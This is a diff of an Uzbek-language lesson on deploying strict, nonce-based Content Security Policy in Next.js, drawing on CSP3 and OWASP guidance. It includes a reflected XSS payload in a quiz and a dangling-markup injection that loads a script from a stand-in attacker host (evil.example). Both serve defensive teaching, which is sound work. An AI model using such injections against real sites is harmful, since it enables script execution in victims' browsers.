@@ -6,11 +6,11 @@ summary: "Nonce asosidagi strict CSP: nega host allowlist ishlamaydi, nonce va '
 duration: 45
 sources:
   - id: nextjs-csp
-    note: "Next.js CSP qo'llanmasi: nonce'ni so'rov bosqichida yaratib sarlavhaga qo'yish va dinamik render talabi haqida umumiy mazmun; fayl nomi va API tafsilotlarini o'z versiyangiz hujjatidan tekshiring"
+    note: "Next.js CSP qo'llanmasi: Proxy (proxy.ts) ichida har so'rovga nonce yaratish va x-nonce sarlavhasi, nonce uchun dinamik render talabi (ISR o'chadi, PPR mos emas, CDN keshi cheklanadi), dev'da 'unsafe-eval', nonce'siz variant va eksperimental SRI alternativasi"
   - id: csp3
-    note: "CSP Level 3: nonce, 'strict-dynamic', Report-Only rejimi va hisobot mexanizmi; spetsifikatsiya umumiy xatti-harakati, bo'lim raqamlari keltirilmaydi"
+    note: "CSP Level 3: nonce kamida 128 bit, har javobda yangi, CSPRNG'dan bo'lishi (Nonce Reuse); nonce-source mavjud bo'lsa 'unsafe-inline' inline uchun hisobga olinmasligi; 'strict-dynamic' host/'self'/'unsafe-inline'ni e'tiborsiz qoldirib, parser-inserted bo'lmagan skriptlarga ruxsat berishi; dangling markup orqali nonce'ni ko'chirish; report-uri deprecated"
   - id: cs-csp
-    note: "OWASP CSP Cheat Sheet: strict policy (nonce yoki hash) va host allowlist'ning kamchiliklari haqida umumiy tavsiya; bo'lim nomlari keltirilmaydi"
+    note: "OWASP CSP Cheat Sheet: Strict CSP (nonce yoki hash, ixtiyoriy strict-dynamic) allowlist'dan afzal, nonce-based va hash-based strict policy namunalari, Report-Only va meta tag cheklovlari, report-to/report-uri, inline handler'larni addEventListener bilan almashtirish"
 quiz:
   - q: "Policy: `script-src 'self' https://cdn.example.com 'unsafe-inline'`. Sahifada reflected XSS bor, hujumchi `<script>alert(1)</script>` kiritdi. Nima bo'ladi?"
     options:
@@ -152,19 +152,25 @@ Bu dars strict CSP'ni Next.js'da joriy qilish yo'l xaritasi: nonce asosidagi pol
 
 ## Asosiy g'oya
 
-Content Security Policy (CSP) javob sarlavhasi bo'lib, brauzerga sahifa qaysi manbalardan skript, stil, rasm va boshqa resurslarni yuklashi mumkinligini aytadi. W3C CSP Level 3 spetsifikatsiyasi mexanizmni belgilaydi. CSP XSS'ni tuzatmaydi: u zaiflik mavjud bo'lganda ham zararni cheklaydigan ikkinchi qatlam (chuqur himoya, 3-dars). Eslatma: Next.js va CSP3 haqidagi da'volar lokal manba nusxalariga (Next.js hujjati, W3C CSP spetsifikatsiyasi) solishtirib tekshirilgan; brauzer versiyalari va qo'llab-quvvatlash jadvallari tekshirilmagan va keltirilmaydi.
+Content Security Policy (CSP) javob sarlavhasi bo'lib, brauzerga sahifa qaysi manbalardan skript, stil, rasm va boshqa resurslarni yuklashi mumkinligini aytadi. W3C CSP Level 3 spetsifikatsiyasi mexanizmni belgilaydi. CSP XSS'ni tuzatmaydi: u zaiflik mavjud bo'lganda ham zararni cheklaydigan ikkinchi qatlam (chuqur himoya, 3-dars).
 
 ### Host allowlist nima uchun yetarli emas
 
-Eski yondashuv: `script-src` ga ishonchli domenlarni sanab chiqish. Kamchiliklar: (1) ro'yxat uzun va doimiy yangilanadi; (2) ro'yxatdagi domen ichida hujumchiga skript yuklashga yo'l beradigan joy bo'lishi mumkin (JSONP endpoint, ochiq CDN'da boshqaning kutubxonasi, eski Angular kabi shablon kutubxonalari); (3) `'unsafe-inline'` kerak bo'lib qoladi, chunki inline skriptlar ishlatiladi. OWASP CSP cheat sheet va umuman industriya tajribasi shu sabab nonce yoki hash asosidagi strict policy'ni tavsiya qiladi.
+Eski yondashuv: `script-src` ga ishonchli domenlarni sanab chiqish. Kamchiliklar: (1) ro'yxat uzun va doimiy yangilanadi; (2) ro'yxatdagi domen ichida hujumchiga skript yuklashga yo'l beradigan joy bo'lishi mumkin (JSONP endpoint, ochiq CDN'da boshqaning kutubxonasi, eski Angular kabi shablon kutubxonalari); (3) `'unsafe-inline'` kerak bo'lib qoladi, chunki inline skriptlar ishlatiladi. OWASP CSP cheat sheet allowlist zaifliklari bo'yicha tadqiqotga havola beradi va hozirgi yetakchi amaliyot sifatida Strict CSP'ni ko'rsatadi: uni joriy qilish osonroq va aylanib o'tish ehtimoli kamroq. Strict CSP nonce yoki hash mexanizmlaridan biriga tayanadi, `'strict-dynamic'` esa ixtiyoriy yordamchi.
 
 ### Nonce va hash
 
-Nonce asosida server har javob uchun yangi tasodifiy qiymat yaratadi, uni CSP sarlavhasiga (`script-src 'nonce-R4nd0m'`) va ruxsat etilgan har `<script nonce="R4nd0m">` tegiga qo'yadi. Brauzer faqat shu nonce'li skriptlarni bajaradi. Hujumchi javobni oldindan bilmaydi, shuning uchun kiritgan `<script>` da nonce yo'q va CSP uni to'sadi. Talablar: nonce yetarlicha uzun va tasodifiy bo'lishi (CSPRNG, 67-dars), har javobda yangi bo'lishi (qayta ishlatilsa, hujumchi uni o'z tegiga ko'chiradi). Hash varianti: `script-src 'sha256-...'` aniq skript matnining xeshini beradi; matn o'zgarmasa, statik sahifalarda ishlaydi, lekin skript matni o'zgarsa policy yangilanishi kerak.
+Nonce asosida server har javob uchun yangi tasodifiy qiymat yaratadi, uni CSP sarlavhasiga (`script-src 'nonce-R4nd0m'`) va ruxsat etilgan har `<script nonce="R4nd0m">` tegiga qo'yadi. Brauzer faqat shu nonce'li skriptlarni bajaradi. Hujumchi javobni oldindan bilmaydi, shuning uchun kiritgan `<script>` da nonce yo'q va CSP uni to'sadi. Talablar: CSP3 nonce har javobda noyob bo'lishini talab qiladi (MUST), uzunligi kodlashdan oldin kamida 128 bit va qiymat kriptografik xavfsiz tasodifiy generatordan (CSPRNG, 67-dars) olinishini tavsiya qiladi (SHOULD). Sababi: nonce direktivadagi boshqa cheklovlarni bekor qiladi, ya'ni uni topgan hujumchi xohlagan skriptni ishga tushiradi. Hash varianti: `script-src 'sha256-...'` aniq skript matnining xeshini beradi va statik sahifalarda ishlaydi, lekin Cheat Sheet ogohlantiradi: tag ichidagi har qanday o'zgarish, hatto bo'shliq (masalan kod formatlanishi), xeshni o'zgartiradi va skript ishlamay qoladi.
 
 ### 'strict-dynamic'
 
 Nonce qo'yilgan skript boshqa skriptlarni dinamik yuklaydi (kutubxona, chunk). Ularning har birini ro'yxatlash o'rniga `'strict-dynamic'` ishonchni nonce/hash bilan kelgan skriptdan u yuklagan skriptlarga o'tkazadi, host va `'self'` ro'yxatlari esa e'tiborsiz qoladi. Bu zamonaviy bundler (Next.js) uchun muhim: chunk fayllar soni katta va ular dinamik yuklanadi.
+
+Spetsifikatsiya aniq ikki ta'sirni beradi. Birinchisi: host-source, scheme-source, `'self'` va `'unsafe-inline'` skript yuklashda e'tiborsiz qoladi, nonce va hash esa hisobga olinadi. Ikkinchisi: parser-inserted bo'lmagan `<script>` elementlari (masalan `document.createElement('script')`) so'rovlari ruxsat etiladi. Spetsifikatsiya misolida nonce'li `script.js` ichidan `createElement` bilan yaratilgan `dependency.js` yuklanadi, `document.write` bilan yozilgan `sadness.js` esa yuklanmaydi, chunki `document.write` parser-inserted element hosil qiladi. Birinchi ta'sirdan orqaga moslik trick'i kelib chiqadi: `'unsafe-inline' https: 'nonce-...' 'strict-dynamic'` CSP1 brauzerida `'unsafe-inline' https:` kabi, CSP3 brauzerida esa `'nonce-...' 'strict-dynamic'` kabi ishlaydi. Xavfi ham aytilgan: runtime'da yaratiladigan skriptga ruxsat berilgani uchun, skript manzilini hujumchi boshqara olsa, policy ixtiyoriy skriptni yuklashga yo'l beradi. Skript joyini runtime'da aniqlaydigan framework va kodlarni audit qilish kerak.
+
+### Nonce'ni ko'chirish: dangling markup
+
+CSP3 nonce'ni hujumchidan sir saqlash kifoya emasligini ko'rsatadi. Agar ineksiya nuqtasi nonce'li `<script>` dan oldin tursa, hujumchi ochiq qoldirilgan teg kiritishi mumkin: `<script src='https://evil.example/x.js' ` kiritilsa, brauzer keyingi `<script nonce=abc src=/good.js>` ning atributlarini shu yangi elementga biriktiradi va nonce hujumchi skriptiga o'tib ketadi. Brauzerlar `<script` yoki `<style` satrini atribut nomi yoki qiymatida topsa nonce'ni bekor qiladi, lekin spetsifikatsiya bu himoyaning o'zi ham to'liq emasligini (takrorlangan atributlar parser tomonidan olib tashlanishi) ochiq yozadi. Amaliy xulosa: nonce'li skriptdan oldingi joyda ham chiqish kodlash (32-dars) majburiy, CSP uni almashtirmaydi.
 
 ### Qo'shimcha direktivalar
 
@@ -216,14 +222,16 @@ Nonce har javobda o'zgargani uchun HTML so'rovga bog'liq bo'ladi. Next.js qo'lla
 
 `Content-Security-Policy-Report-Only` sarlavhasi policy'ni to'sib qo'ymasdan faqat buzilishlarni hisobotlaydi (CSP3 mexanizmi). Tavsiya etilgan jarayon:
 
-1. Strict policy'ni Report-Only rejimida yoqing va hisobot qabul qiluvchi endpoint (yoki hisobot xizmati) ulang. CSP3 spetsifikatsiyasi `report-uri` ni eskirgan (deprecated) deb belgilaydi va `report-to` ni tavsiya qiladi; ko'p muhitda ikkalasi birga yoziladi. Brauzerlarning qo'llab-quvvatlashi har xil, o'z auditoriyangiz brauzerlarida tekshiring.
+1. Strict policy'ni Report-Only rejimida yoqing va hisobot qabul qiluvchi endpoint (yoki hisobot xizmati) ulang. CSP3 `report-uri` ni deprecated deb belgilaydi va `report-to` ni tavsiya qiladi; Cheat Sheet orqaga moslik uchun ikkalasini birga yozishni maslahat beradi: `report-to`ni qo'llaydigan brauzer `report-uri`ni e'tiborsiz qoldiradi, eski brauzer unga qaytadi.
 2. Hisobotlarni bir necha kun o'qing: qaysi skriptlar nonce'siz ishlayapti (analitika, vidjetlar, ichki inline skriptlar)? Har birini nonce'ga o'tkazing yoki olib tashlang.
 3. Violation soni past bo'lgach, policy'ni enforce qiling (`Content-Security-Policy`). Report-Only'ni parallel qoldirib, keyingi o'zgarishlarni ham sinash mumkin.
 4. Trusted Types (34-dars) uchun `require-trusted-types-for 'script'` ni ham avval Report-Only'da yoqing.
 
+Cheat Sheet yana bir tartibni ko'rsatadi: ikkala sarlavhani bir vaqtda ishlatish mumkin, shuning uchun qattiq policy'ni Report-Only'da ushlab turib (ko'p hisobot olish uchun), enforce qilinadigan yumshoqroq policy bilan qonuniy funksiyalarni buzmaslik mumkin. Inline kod ham ko'chiriladi: inline `<script>` bloki alohida `.js` faylga, `onclick="doSomething()"` kabi inline handler esa `addEventListener` chaqiruviga o'tkaziladi, chunki CSP inline voqea handler'larini ham to'sadi. Eslatma: nonce'ni ta'minlash uchun barcha `<script>` teglariga nonce qo'shadigan o'rta qatlam yozmang; Cheat Sheet buni qat'iy man etadi, chunki hujumchi kiritgan skriptlar ham nonce oladi. Nonce faqat sizning shabloningiz yozgan teglarga qo'yilishi kerak.
+
 ### Policy'ni tekshirish
 
-Qo'lda yozilgan policy xato bo'lishi oson: bitta `'unsafe-inline'` yoki `*` hamma narsani bekor qiladi. Policy'ni avtomatik lint qiling (quyidagi misol soddalashtirilgan variant) va brauzerda DevTools konsolida violation xabarlarini ko'ring. Boshqa asboblar: CSP evaluator turidagi onlayn vositalar va WSTG tekshiruvlari (92-dars).
+Qo'lda yozilgan policy xato bo'lishi oson: bitta `'unsafe-inline'` yoki `*` hamma narsani bekor qiladi. Policy'ni avtomatik lint qiling (quyidagi misol soddalashtirilgan variant) va brauzerda DevTools konsolida violation xabarlarini ko'ring. Policy meta teg orqali ham berilishi mumkin (header'ga kira olmaydigan statik CDN hostingda), lekin Cheat Sheet bu holda `frame-ancestors`, `sandbox` va hisobot endpoint'i ishlamasligini aytadi, shuning uchun imkon bo'lsa sarlavhadan foydalaning. Qo'lda sinash va WSTG tekshiruvlari (92-dars) lint'ni to'ldiradi.
 
 ## Misol: zaif va strict policy
 
@@ -349,7 +357,7 @@ Yopilmagan narsalar: (1) nonce sizib chiqsa (log, keshlangan HTML, reflected non
 
 ## Stack'da: Next.js, NestJS va Nginx
 
-Next.js'da policy Proxy'da yoki `next.config` `headers()` ichida beriladi. Nonce kerak bo'lgani uchun Proxy varianti; statik policy (nonce'siz, `'self'` va hash) `next.config` da. Server komponentida nonce'ni olish:
+Next.js'da policy Proxy'da yoki `next.config` `headers()` ichida beriladi. Nonce kerak bo'lsa Proxy varianti ishlatiladi. Nonce'siz variant hujjatda `next.config` ichida `script-src 'self' 'unsafe-inline'` bilan beriladi, lekin bu inline skriptni ruxsat etgani uchun skript injection'ga qarshi kuchsiz; kuchli nonce'siz yo'l eksperimental SRI (`experimental.sri`) bilan `script-src 'self'`. Server komponentida nonce'ni olish:
 
 ```tsx
 import { headers } from "next/headers";
